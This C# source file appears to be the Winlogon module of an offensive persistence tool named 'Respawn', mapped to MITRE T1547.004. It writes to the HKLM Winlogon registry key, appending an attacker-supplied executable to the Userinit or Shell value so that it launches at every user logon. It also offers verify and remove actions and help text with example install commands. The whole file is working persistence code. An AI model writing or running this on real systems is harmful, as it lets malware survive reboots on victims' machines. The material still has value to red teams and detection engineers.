using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.Winlogon
{
    public class WinlogonModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "winlogon";
        public string Name        => "Winlogon Helper";
        public string Mitre       => "T1547.004";
        public string Description => "Description: Persist by abusing the Windows Logon (winlogon.exe) registry keys, appending a malicious executable path to the system's Userinit or Shell values so that it is automatically launched alongside the legitimate desktop initialization processes.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath      = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
        const string UserInitKey  = "Userinit";
        const string ShellKey     = "Shell";

        const string UserInitDefault = @"C:\Windows\system32\userinit.exe,";
        const string ShellDefault    = "explorer.exe";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            // 2. OPERATIONAL NOTES
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  OPERATIONAL NOTES:");
            // Console.ResetColor();
            // Console.WriteLine("    - Modifies 'Userinit' or 'Shell' to chain your payload");
            // Console.WriteLine("    - CRITICAL: Improper strings can break the logon process");
            // Console.WriteLine("    - Always 'verify' before 'remove' to ensure string integrity");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-k,  --key", "Winlogon Value ID (userinit, shell)");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Full path to the executable (.exe only)");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t winlogon -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t winlogon -a install -k userinit -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t winlogon -a verify  -k userinit -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t winlogon -a remove  -k userinit -p \"C:\\p.exe\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return WinlogonKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var key = WinlogonKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key id '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening Winlogon registry key. Run as administrator.");

                string valueName    = ResolveValueName(ctx.Key);
                string currentValue = regKey.GetValue(valueName)?.ToString() ?? GetDefault(ctx.Key);

                // check if payload already present
                if (currentValue.Contains(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.Exists($"Payload already present in Winlogon {valueName} value.");

                // append payload
                string newValue = ctx.Key.Equals("userinit", StringComparison.OrdinalIgnoreCase)
                    ? currentValue.TrimEnd() + "," + ctx.Payload        // userinit uses comma separator
                    : currentValue.TrimEnd() + "," + ctx.Payload;       // shell also uses comma separator

                regKey.SetValue(valueName, newValue);
                return TechniqueResult.Ok($"Installed '{ctx.Payload}' appended to Winlogon {valueName} value.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Winlogon requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var key = WinlogonKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key id '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening Winlogon registry key. Run as administrator.");

                string valueName    = ResolveValueName(ctx.Key);
                string currentValue = regKey.GetValue(valueName)?.ToString() ?? GetDefault(ctx.Key);

                if (!currentValue.Contains(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.NotFound($"Payload '{ctx.Payload}' not found in Winlogon {valueName} value.");

                // remove payload and clean up separators
                string newValue = RemoveFromValue(currentValue, ctx.Payload, ctx.Key);

                regKey.SetValue(valueName, newValue);
                return TechniqueResult.Ok($"Removed '{ctx.Payload}' from Winlogon {valueName} value.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Winlogon requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var key = WinlogonKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key id '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening Winlogon registry key. Run as administrator.");

                string valueName    = ResolveValueName(ctx.Key);
                string currentValue = regKey.GetValue(valueName)?.ToString() ?? GetDefault(ctx.Key);

                if (!currentValue.Contains(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.NotFound($"Payload '{ctx.Payload}' not found in Winlogon {valueName} value.");

                return TechniqueResult.Ok($"Verified '{ctx.Payload}' present in Winlogon {valueName} -> '{currentValue}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Winlogon requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private string ResolveValueName(string keyId) =>
            keyId.Equals("userinit", StringComparison.OrdinalIgnoreCase) ? UserInitKey : ShellKey;

        private string GetDefault(string keyId) =>
            keyId.Equals("userinit", StringComparison.OrdinalIgnoreCase) ? UserInitDefault : ShellDefault;

        private string RemoveFromValue(string currentValue, string payload, string keyId)
        {
            // remove all variations: ",payload" or "payload," or just "payload"
            string result = currentValue;

            result = result.Replace("," + payload, "", StringComparison.OrdinalIgnoreCase);
            result = result.Replace(payload + ",", "", StringComparison.OrdinalIgnoreCase);
            result = result.Replace(payload,       "", StringComparison.OrdinalIgnoreCase);

            // ensure default value is preserved and clean up double commas
            result = result.Replace(",,", ",").TrimEnd(',');

            // restore default if value was wiped entirely
            if (string.IsNullOrWhiteSpace(result))
                result = GetDefault(keyId);

            return result;
        }

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Key))
            {
                error = "No key specified. Use -k <key-id> or see -a list-keys.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && !ctx.Payload.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            {
                error = "Winlogon only supports .exe payloads.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}